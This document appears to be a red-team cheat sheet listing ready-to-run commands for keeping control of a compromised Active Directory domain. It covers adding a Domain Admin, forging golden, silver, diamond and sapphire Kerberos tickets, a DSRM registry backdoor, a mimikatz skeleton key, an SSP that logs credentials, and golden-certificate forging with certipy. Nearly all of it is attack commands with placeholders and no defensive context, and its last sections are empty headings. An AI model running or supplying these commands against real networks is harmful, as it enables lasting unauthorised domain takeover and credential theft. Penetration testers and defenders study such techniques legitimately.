# Persistence

## ADD DA
- `net group "domain admins" myuser /add /domain`

## Golden ticket
- `ticketer.py -aesKey <aeskey> -domain-sid <domain_sid> -domain <domain> <anyuser>`
- `mimikatz "kerberos::golden /user:<admin_user> /domain:<domain> /sid:<domain-sid>/aes256:<krbtgt_aes256> /ptt"`

## Silver Ticket
- `mimikatz "kerberos::golden /sid:<current_user_sid> /domain:<domain-sid> /target:<target_server> /service:<target_service> /aes256:<computer_aes256_key> /user:<any_user> /ptt"`
- `ticketer.py -nthash <machine_nt_hash> -domain-sid <domain_sid> -domain <domain> <anyuser>`

## Directory Service Restore Mode (DSRM)
- `PowerShell New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD`

## Skeleton Key
- `mimikatz "privilege::debug" "misc::skeleton" "exit" #password is mimikatz`

## Custom SSP
- `mimikatz "privilege::debug" "misc::memssp" "exit"`
  - C:\Windows\System32\kiwissp.log

## Golden certificate
- `certipy ca -backup -ca '<ca_name>' -username <user>@<domain> -hashes <hash>`
  - `certipy forge -ca-pfx <ca_private_key> -upn <user>@<domain> -subject 'CN=<user>,CN=Users,DC=<CORP>,DC=<LOCAL>`

## Diamond ticket
- `ticketer.py -request -domain <domain> -user <user> -password <password> -nthash <hash> -aesKey <aeskey> -domain-sid <domain_sid>  -user-id <user_id> -groups '512,513,518,519,520' <anyuser>`

## Saphire Ticket
- `ticketer.py -request -impersonate <anyuser> -domain <domain> -user <user> -password <password>  -nthash <hash> -aesKey <aeskey> -domain-sid <domain_sid>  'ignored'`
  
## DC shadow

## ACL manipulation

## ...
